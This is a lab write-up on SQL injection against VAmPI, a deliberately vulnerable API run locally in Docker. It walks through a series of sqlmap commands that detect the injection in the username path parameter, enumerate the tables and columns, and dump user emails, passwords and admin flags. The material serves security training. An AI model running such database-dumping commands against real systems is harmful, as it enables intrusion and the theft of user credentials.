# 🔬 VAmPI Lab – SQL Injection

## 📋 Setup

### 📚 Repository

- `https://github.com/erev0s/VAmPI`

### 🐳 Run using Docker

```bash
docker run -p 5000:5000 erev0s/vampi:latest
```

## 🎯 Target Endpoint

- `http://192.168.1.28:5000/users/v1/name1`

## 📨 Request

```
GET /users/v1/name1 HTTP/1.1
Host: 192.168.1.28:5000
Accept: application/json
```

## 🔍 Vulnerability Description

The endpoint `/users/v1/<username>` is vulnerable to SQL Injection via the path parameter. User input is directly used in backend SQL queries without proper sanitization.

---

## 🛠️ Exploitation Using sqlmap

### 🔎 Basic Detection

Detect SQL injection vulnerability:

```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1*
```

### 🗄️ Enumerate Databases

Enumerate available databases:

```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* --dbs
```

### 📊 List Tables

List all tables in the SQLite database:

```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* -D SQLite --tables
```

### 📋 List Columns

List columns from the `users` table:

```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* -D SQLite -T users --columns
```

### 👥 Dump User Data

Extract sensitive user information (id, email, username, password, admin):

```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* -D SQLite -T users -C id,email,username,password,admin --dump
```

### 🔓 Dump Additional Tables

Enumerate and dump other tables for complete database access:

```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* -D SQLite -T books --dump
```
